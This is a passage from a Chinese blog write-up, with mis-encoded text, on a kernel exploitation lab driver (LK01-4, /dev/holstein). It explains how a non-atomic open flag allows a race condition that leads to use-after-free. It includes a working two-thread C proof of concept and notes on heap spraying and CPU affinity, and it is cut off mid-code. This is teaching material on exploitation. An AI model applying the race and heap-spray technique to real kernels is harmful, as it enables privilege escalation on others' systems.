punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_298<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_253<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="module-close"><a href="#module-close" class="headerlink" title="module_close"></a>module_close</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_226<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  mutex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç½®ç©ºäº†mutex</p><h2 id="äºŒ-åˆ©ç”¨æ€è·¯"><a href="#äºŒ-åˆ©ç”¨æ€è·¯" class="headerlink" title="(äºŒ)åˆ©ç”¨æ€è·¯"></a>(äºŒ)åˆ©ç”¨æ€è·¯</h2><p>LK01-4è¯•å›¾é€šè¿‡å¼•å…¥ä¸€ä¸ªæ–°çš„mutexå˜é‡æ¥ä¿è¯åŒä¸€æ—¶åˆ»ç›®æ ‡è®¾å¤‡åªèƒ½è¢«æ‰“å¼€ä¸€æ¬¡ã€‚å¦‚æœè¯¥æªæ–½æœ‰æ•ˆï¼Œæˆ‘ä»¬å°±ä¸èƒ½é€šè¿‡openä¸¤æ¬¡å¹¶close(fd1)æ¥åˆ¶é€ åŠè§¦å‘UAFäº†ã€‚</p><p>ä½†æ˜¯ï¼Œæ–°å¼•å…¥çš„mutexå˜é‡ä½œä¸ºä¿æŠ¤æªæ–½ï¼ŒçœŸçš„èƒ½å¤Ÿæœ‰æ•ˆä¿è¯åŒä¸€æ—¶åˆ»ç›®æ ‡è®¾å¤‡åªèƒ½è¢«æ‰“å¼€ä¸€æ¬¡å—ï¼Ÿä¸€æ—¦æˆ‘ä»¬æœ‰æŸç§æ–¹å¼èƒ½å¤Ÿç»•è¿‡è¿™å±‚ä¿æŠ¤ï¼ŒåŒæ—¶æ‰“å¼€å¤šæ¬¡è¯¥è®¾å¤‡ï¼Œé‚£ä¹ˆè¯¥æƒ…æ™¯å®é™…ä¸Šå°±é€€åŒ–æˆäº†UAFçš„æƒ…æ™¯ã€‚</p><p>å°½ç®¡è¿™ä¸ªé©±åŠ¨ç¨‹åºå®ç°çœ‹èµ·æ¥å¾ˆå®Œç¾ï¼Œä½†å®ƒä»ç„¶æ²¡æœ‰å®Œå…¨è€ƒè™‘<strong>è®¿é—®å¤šä¸ªè¿›ç¨‹æˆ–èµ„æºçš„æƒ…å†µã€‚</strong></p><p>æ“ä½œç³»ç»Ÿå®ç°ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œä»¥ä¾¿å¤šä¸ªè¿›ç¨‹ï¼ˆçº¿ç¨‹ï¼‰å¯ä»¥åŒæ—¶è¿è¡Œï¼Œå¹¶ç®¡ç†è¿›ç¨‹ï¼Œå®ç°å¤šä¸ªçº¿ç¨‹è¿è¡Œå¤šä¸ªç¨‹åºã€‚ä¸Šä¸‹æ–‡åˆ‡æ¢å¹¶ä¸æ˜¯åƒå‡½æ•°é‚£æ ·çš„å¤§ç²’åº¦ï¼Œè€Œæ˜¯ä»¥æ±‡ç¼–æŒ‡ä»¤ä¸ºå•ä½ã€‚å› æ­¤ï¼Œmodule_openå‡½æ•°åœ¨æ‰§è¡ŒæœŸé—´ä¸Šä¸‹æ–‡å¯èƒ½ä¼šå‘ç”Ÿåˆ‡æ¢ã€‚</p><h3 id="ç«æ€æ¡ä»¶æ¼æ´"><a href="#ç«æ€æ¡ä»¶æ¼æ´" class="headerlink" title="ç«æ€æ¡ä»¶æ¼æ´"></a>ç«æ€æ¡ä»¶æ¼æ´</h3><p>æˆ‘ä»¬æ¥ä¸‹æ¥çœ‹ä¸¤ç§æƒ…å†µï¼Œæ–¹ä¾¿ç†è§£ï¼š</p><ol><li>ç†æƒ³çŠ¶æ€ä¸‹ï¼Œçº¿ç¨‹Aé¦–å…ˆæ‰“å¼€ç›®æ ‡è®¾å¤‡ï¼Œ<code>module_open</code>å‡½æ•°æ‰§è¡Œï¼Œmutexå…¨å±€å˜é‡è¢«è®¾ç½®1ï¼›æ­¤æ—¶çº¿ç¨‹Bå†å°è¯•æ‰“å¼€ï¼Œ<code>module_open</code>å°†è¿”å›EBUSYé”™è¯¯ä¿¡æ¯ï¼Œæ‰“å¼€å¤±è´¥ã€‚</li></ol><p><img src="/EXP_FILE/15d087d4882c2f3756eb151f76204d97_MD5.jpeg"></p><ol start="2"><li>ç„¶è€Œï¼Œè¿˜æœ‰ä¸€ç§æƒ…å†µæ˜¯ï¼Œçº¿ç¨‹Aé¦–å…ˆæ‰“å¼€ç›®æ ‡è®¾å¤‡ï¼Œæ‰§è¡Œ<code>module_open</code>å‡½æ•°åˆ°<code>if (mutex)</code>åˆ¤æ–­è¯­å¥åã€<code>mutex=1</code>æ“ä½œä¹‹å‰æ—¶ï¼Œçº¿ç¨‹BåŒæ ·ä¹Ÿæ‰§è¡Œåˆ°äº†<code>if (mutex)</code>åˆ¤æ–­è¯­å¥åã€<code>mutex=1</code>æ“ä½œä¹‹å‰ã€‚è¿™æ ·ä¸€æ¥ï¼Œçº¿ç¨‹Aå’Œçº¿ç¨‹Béƒ½èƒ½é¡ºåˆ©æ‰“å¼€è¯¥è®¾å¤‡ï¼Œ<code>mutex=1</code>å°†è¢«æ‰§è¡Œä¸¤æ¬¡ã€‚<br><img src="/EXP_FILE/36107d8d89958b1d3f62dc5d7a428f8d_MD5.jpeg"></li></ol><blockquote><p>è¿™æ˜¯ç”±äºæ²¡æœ‰ä½¿ç”¨åŸå­æ“ä½œæ¥è¯»å†™å˜é‡<code>äº’æ–¥ä½“</code>è€Œå¯¼è‡´çš„å†²çªã€‚<br><code>äº’æ–¥ä½“</code>æ˜¯ä¸€ç§åŒæ­¥å¯¹è±¡ï¼Œç”¨äºä¿æŠ¤å¤šä¸ªçº¿ç¨‹æˆ–è¿›ç¨‹ä¹‹é—´å…±äº«çš„èµ„æºã€‚äº’æ–¥ä½“çš„å«ä¹‰æ˜¯â€œäº’ç›¸æ’æ–¥â€ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒåŒä¸€æ—¶é—´åªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹æˆ–è¿›ç¨‹æ‹¥æœ‰äº’æ–¥ä½“çš„æ‰€æœ‰æƒï¼Œä»è€Œç‹¬å è®¿é—®å…±äº«èµ„æºã€‚å…¶ä»–çº¿ç¨‹æˆ–è¿›ç¨‹å¿…é¡»ç­‰å¾…äº’æ–¥ä½“è¢«é‡Šæ”¾åæ‰èƒ½å°è¯•è·å–äº’æ–¥ä½“çš„æ‰€æœ‰æƒã€‚</p></blockquote><p>æˆ‘ä»¬æ¥ç¼–å†™ä»£ç éªŒè¯å¯è¡Œæ€§ï¼Œpocå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">int</span> win <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">race</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>win<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span>                win <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>win <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> fd <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">close</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">close</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            win <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">pthread_t</span> th1<span class="token punctuation">,</span> th2<span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] running thread 1 and thread 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th1<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> race<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th2<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> race<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">pthread_join</span><span class="token punctuation">(</span>th1<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">pthread_join</span><span class="token punctuation">(</span>th2<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] reached race condition"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x400</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> fd1 <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span> fd2 <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] writing \'aptx4869\' into fd 3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span>fd1<span class="token punctuation">,</span> <span class="token string">"aptx4869"</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] reading from fd 4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] content: %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ›å»ºäº†ä¸¤ä¸ªç«äº‰çº¿ç¨‹ï¼Œä¸æ–­è¿›è¡Œmodule_openç›´åˆ°ä¸¤è€…èƒ½å¤ŸåŒæ—¶æ‰“å¼€è®¾å¤‡</p><h3 id="CPUä¸å †å–·å°„"><a href="#CPUä¸å †å–·å°„" class="headerlink" title="CPUä¸å †å–·å°„"></a>CPUä¸å †å–·å°„</h3><p>æˆ‘ä»¬çŸ¥é“ï¼Œå¤šçº¿ç¨‹ä¸­çš„ç«äº‰æ¡ä»¶æ„å‘³ç€æ”»å‡»æœŸé—´ä½¿ç”¨äº†å¤šä¸ª CPU æ ¸å¿ƒï¼Œè€ŒSLUBåˆ†é…å™¨ç®¡ç†ç”¨äºåœ¨æ¯ä¸ªCPUçš„å†…å­˜åŒºåŸŸä¸­åˆ†é…å¯¹è±¡çš„slabã€‚</p><p>æ¢å¥è¯è¯´ï¼Œå¦‚æœä¸€ä¸ªå‡½æ•°æ˜¯ä»ä¸å½“å‰è¿è¡Œè¯¥å‡½æ•°çš„çº¿ç¨‹ä¸åŒçš„CPUæ ¸åˆ†é…çš„ï¼Œé‚£ä¹ˆå®ƒè‡ªç„¶ä¼šé“¾æ¥åˆ°åˆ†é…æ—¶çš„CPUæ ¸å¯¹åº”çš„slabã€‚é‚£ä¹ˆï¼Œå³ä½¿ä¹‹åä½ åœ¨çº¿ç¨‹ä¸­ä½¿ç”¨Heap Spray ï¼Œå…¶ä¹Ÿä¸ä¼šå—åˆ°Heap Sprayçš„å½±å“ã€‚ å› æ­¤ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¯·å°å¿ƒå¤šçº¿ç¨‹çš„Heap Spray ã€‚</p><p>å¦å¤–ï¼Œ&#x2F;dev&#x2F;ptmxé€šè¿‡æ‰“å¼€æ–‡ä»¶æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œä½†æ˜¯ä¸€ä¸ªè¿›ç¨‹å¯ä»¥åˆ›å»ºçš„æ–‡ä»¶æè¿°ç¬¦çš„æ•°é‡æ˜¯æœ‰é™åˆ¶çš„ï¼Œæ‰€ä»¥å¦‚æœéœ€è¦å¤§é‡çš„å–·å°„ï¼Œè¿˜éœ€è¦å…³é—­æ–‡ä»¶æè¿°ç¬¦ã€‚</p><h3 id="CPU-Affinity-CPUäº²å’Œæ€§"><a href="#CPU-Affinity-CPUäº²å’Œæ€§" class="headerlink" title="CPU Affinity(CPUäº²å’Œæ€§)"></a>CPU Affinity(CPUäº²å’Œæ€§)</h3><ul><li>ä¸€äº›åŸºç¡€çŸ¥è¯†<br>**è¶…çº¿ç¨‹æŠ€æœ¯(Hyper-Threading)**ï¼šå°±æ˜¯åˆ©ç”¨ç‰¹æ®Šçš„ç¡¬ä»¶æŒ‡ä»¤ï¼ŒæŠŠä¸¤ä¸ªé€»è¾‘å†…æ ¸(CPU core)æ¨¡æ‹Ÿæˆä¸¤ä¸ªç‰©ç†èŠ¯ç‰‡ï¼Œè®©å•ä¸ªå¤„ç†å™¨éƒ½èƒ½ä½¿ç”¨çº¿ç¨‹çº§å¹¶è¡Œè®¡ç®—ï¼Œè¿›è€Œå…¼å®¹å¤šçº¿ç¨‹æ“ä½œç³»ç»Ÿå’Œè½¯ä»¶ï¼Œå‡å°‘äº†CPUçš„é—²ç½®æ—¶é—´ï¼Œæé«˜çš„CPUçš„è¿è¡Œæ•ˆç‡ã€‚CPUçš„ä¸€ä¸ªæ ¸å¿ƒæœ€å°‘å¯¹åº”ä¸€ä¸ªçº¿ç¨‹ï¼Œä½†é€šè¿‡è¶…çº¿ç¨‹ï¼ˆHT, Hyper-Threadingï¼‰æŠ€æœ¯ï¼Œä¸€ä¸ªæ ¸å¿ƒå¯ä»¥æœ‰ä¸¤ä¸ªçº¿ç¨‹æˆ–å¤šä¸ªçº¿ç¨‹ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒå¯ä»¥åŒæ—¶è¿è¡Œä¸¤ä¸ªæˆ–å¤šä¸ªçº¿ç¨‹ã€‚æ¯”å¦‚è¯´æˆ‘ä»¬å¸¸å¬åˆ°çš„åŒæ ¸å››çº¿ç¨‹&#x2F;å››æ ¸å…«çº¿ç¨‹æŒ‡çš„å°±æ˜¯æ”¯æŒè¶…çº¿ç¨‹æŠ€æœ¯çš„CPUã€‚</li></ul><p><strong>ç‰©ç†CPU</strong>ï¼šæœºå™¨ä¸Šå®‰è£…çš„å®é™…CPUã€‚æ¯”å¦‚è¯´ä½ çš„ä¸»æ¿ä¸Šå®‰è£…äº†ä¸€ä¸ª8æ ¸CPU,é‚£ä¹ˆç‰©ç†CPUä¸ªæ•°å°±æ˜¯1ä¸ª,æ‰€ä»¥ç‰©ç†CPUä¸ªæ•°å°±æ˜¯ä¸»æ¿ä¸Šå®‰è£…çš„CPUä¸ªæ•°ã€‚</p><p><strong>é€»è¾‘CPU</strong>ï¼šä¸€èˆ¬æƒ…å†µï¼Œæˆ‘ä»¬è®¤ä¸ºä¸€é¢—CPUå¯ä»¥æœ‰å¤šæ ¸ï¼ŒåŠ ä¸Šintelçš„è¶…çº¿ç¨‹æŠ€æœ¯(HT), å¯ä»¥åœ¨é€»è¾‘ä¸Šå†åˆ†ä¸€å€æ•°é‡çš„CPU coreå‡ºæ¥ã€‚<code>é€»è¾‘CPUæ•°é‡ = ç‰©ç†CPUæ•°é‡ x CPU cores x 2(å¦‚æœæ”¯æŒå¹¶å¼€å¯HT)</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># æŸ¥çœ‹ç‰©ç†CPUä¸ªæ•°</span><span class="token function">cat</span> /proc/cpuinfo<span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"physical id"</span><span class="token operator">|</span><span class="token function">sort</span> -u<span class="token operator">|</span><span class="token function">wc</span> <span class="token parameter variable">-l</span><span class="token comment"># æŸ¥çœ‹æ¯ä¸ªç‰©ç†CPUä¸­coreçš„ä¸ªæ•°(å³æ ¸æ•°)</span><span class="token function">cat</span> /proc/cpuinfo<span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"cpu cores"</span><span class="token operator">|</span><span class="token function">uniq</span><span class="token comment"># æŸ¥çœ‹é€»è¾‘CPUçš„ä¸ªæ•°</span><span class="token function">cat</span> /proc/cpuinfo<span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"processor"</span><span class="token operator">|</span><span class="token function">wc</span> <span class="token parameter variable">-l</span><span class="token comment"># æŸ¥çœ‹CPUçš„åç§°å‹å·</span><span class="token function">cat</span> /proc/cpuinfo<span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"name"</span><span class="token operator">|</span><span class="token function">cut</span> <span class="token parameter variable">-f2</span> -d:<span class="token operator">|</span><span class="token function">uniq</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ä½•ä¸ºCPUäº²å’Œæ€§<br>CPUç»‘å®šæŒ‡çš„æ˜¯åœ¨å¤šæ ¸CPUçš„ç³»ç»Ÿä¸­å°†è¿›ç¨‹æˆ–çº¿ç¨‹ç»‘å®šåˆ°æŒ‡å®šçš„CPUæ ¸ä¸Šå»æ‰§è¡Œã€‚åœ¨Linuxä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>CPU affinity</code>å±æ€§æŠŠè¿›ç¨‹ç»‘å®šåˆ°ä¸€ä¸ªæˆ–å¤šä¸ªCPUæ ¸ä¸Šã€‚</li></ul><p><code>CPU Affinity</code>æ˜¯è¿›ç¨‹çš„ä¸€ä¸ªå±æ€§ï¼Œè¿™ä¸ªå±æ€§æŒ‡æ˜äº†è¿›ç¨‹è°ƒåº¦å™¨èƒ½å¤ŸæŠŠè¿™ä¸ªè¿›ç¨‹è°ƒåº¦åˆ°å“ªäº›CPUä¸Šã€‚è¯¥å±æ€§è¦æ±‚è¿›ç¨‹åœ¨æŸä¸ªæŒ‡å®šçš„CPUä¸Šå°½é‡é•¿æ—¶é—´åœ°è¿è¡Œè€Œä¸è¢«è¿ç§»åˆ°å…¶ä»–å¤„ç†å™¨ã€‚</p><p>Linuxæä¾›äº†è½¯CPUäº²å’Œæ€§å’Œç¡¬CPUäº²å’Œæ€§ï¼š<br>    <code>soft affinity</code>ï¼Œè¿›ç¨‹å°½é‡åœ¨æŒ‡å®šçš„CPUä¸Šé•¿æ—¶é—´è¿è¡Œï¼Œä¸è¢«è¿ç§»åˆ°å…¶ä»–CPUã€‚ä½†æ˜¯å¦‚æœç‰¹æ®Šæƒ…å†µï¼Œè°ƒåº¦å™¨è¿˜æ˜¯ä¼šæŠŠè¿›ç¨‹è°ƒåº¦åˆ°å…¶å®ƒçš„CPUä¸Šå»æ‰§è¡Œ<br>    <code>hard affinity</code>ï¼Œå°†è¿›ç¨‹æˆ–çº¿ç¨‹ç»‘å®šåˆ°ç‰¹å®šçš„CPUæ ¸å¿ƒä¸Šè¿è¡Œã€‚è°ƒåº¦å™¨å¿…é¡»ä¸¥æ ¼éµå®ˆè§„åˆ™ã€‚</p><h3 id="è®¾ç½®CPU-Affinity"><a href="#è®¾ç½®CPU-Affinity" class="headerlink" title="è®¾ç½®CPU Affinity"></a>è®¾ç½®CPU Affinity</h3><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://zhuanlan.zhihu.com/p/432940336">å¦‚ä½•å°†è¿›ç¨‹ã€çº¿ç¨‹ä¸CPUæ ¸è¿›è¡Œç»‘å®š - çŸ¥ä¹ (zhihu.com)</a></p></blockquote><ul><li>åœ¨Linuxä¸­ï¼Œç”¨ç»“æ„ä½“<code>cpu_set_t</code>æ¥è¡¨ç¤ºCPU Affinityæ©ç ï¼Œå®ƒæ˜¯ä¸€ä¸ªä½å›¾ï¼Œæ¯ä¸€ä½éƒ½ä»£è¡¨ä¸€ä¸ªCPUæ ¸å¿ƒã€‚é€šè¿‡è®¾ç½®å’Œæ“ä½œè¿™ä¸ªä½å›¾ï¼Œå¯ä»¥æ§åˆ¶è¿›ç¨‹æˆ–çº¿ç¨‹çš„ CPU äº²å’Œæ€§ï¼Œå³å°†å…¶ç»‘å®šåˆ°ç‰¹å®šçš„ CPU æ ¸å¿ƒä¸Šã€‚æœ‰å¦‚ä¸‹ä¸€ç³»åˆ—çš„å®æ¥ç”¨äºæ“ä½œè¿›ç¨‹çš„å¯è°ƒåº¦CPUé›†åˆï¼š</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token keyword">void</span> <span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å°†setä¸­çš„æ‰€æœ‰ä½æ¸…é›¶ï¼Œè¡¨ç¤ºæ²¡æœ‰ä»»ä½•CPUæ ¸å¿ƒè¢«è®¾ç½®ã€‚</span><span class="token keyword">void</span> <span class="token function">CPU_SET</span><span class="token punctuation">(</span><span class="token keyword">int</span> cpu<span class="token punctuation">,</span> <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å°†setä¸­çš„ç¬¬cpuä½è®¾ç½®ä¸º1ï¼Œè¡¨ç¤ºå°†å¯¹åº”çš„CPUæ ¸å¿ƒæ·»åŠ åˆ°é›†åˆä¸­ã€‚</span><span class="token keyword">void</span> <span class="token function">CPU_CLR</span><span class="token punctuation">(</span><span class="token keyword">int</span> cpu<span class="token punctuation">,</span> <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å°†setä¸­çš„ç¬¬cpuä½æ¸…é›¶ï¼Œè¡¨ç¤ºå°†å¯¹åº”çš„CPUæ ¸å¿ƒä»é›†åˆä¸­ç§»é™¤ã€‚</span><span class="token keyword">int</span>  <span class="token function">CPU_ISSET</span><span class="token punctuation">(</span><span class="token keyword">int</span> cpu<span class="token punctuation">,</span> <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ£€æŸ¥setä¸­çš„ç¬¬cpuä½æ˜¯å¦è¢«è®¾ç½®ä¸º1ï¼Œè¿”å›ä¸€ä¸ªéé›¶å€¼è¡¨ç¤ºå·²è®¾ç½®ï¼Œå¦åˆ™è¿”å›0ã€‚</span><span class="token keyword">int</span>  <span class="token function">CPU_COUNT</span><span class="token punctuation">(</span><span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">CPU_AND</span><span class="token punctuation">(</span><span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>destset<span class="token punctuation">,</span> <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>srcset1<span class="token punctuation">,</span> <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>srcset2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">CPU_OR</span><span class="token punctuation">(</span><span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>destset<span class="token punctuation">,</span> <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>srcset1<span class="token punctuation">,</span> <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>srcset2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">CPU_XOR</span><span class="token punctuation">(</span><span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>destset<span class="token punctuation">,</span> <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>srcset1<span class="token punctuation">,</span> <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>srcset2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span>  <span class="token function">CPU_EQUAL</span><span class="token punctuation">(</span><span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>set1<span class="token punctuation">,</span> <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>set2<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>è‹¥è¦å°†è¿›ç¨‹å’ŒCPUæ ¸ç»‘å®šï¼Œæœ‰<code>sched_setaffinity</code>å¯ä¾›ä½¿ç”¨ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro 